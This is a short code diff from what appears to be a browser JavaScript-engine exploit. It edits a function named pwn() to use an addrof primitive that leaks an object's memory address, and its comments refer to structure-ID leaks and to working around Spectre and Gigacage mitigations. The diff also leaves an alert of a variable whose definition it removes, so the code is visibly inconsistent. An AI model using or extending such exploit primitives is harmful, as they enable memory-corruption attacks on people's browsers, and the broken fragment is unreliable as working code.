@@ -194,7 +194,8 @@ function pwn() {
    // sprayStructures();
 
     var targetArray = new Array();
-    var structureid = leakStructureId(targetArray);
+    var realjscell = primitives.addrof(targetArray[0])
+    alert(realjscell)
     alert(structureid);
 // post spectre & gigacage compatible
     // however, memory rw is backed by normal js objects and not typed
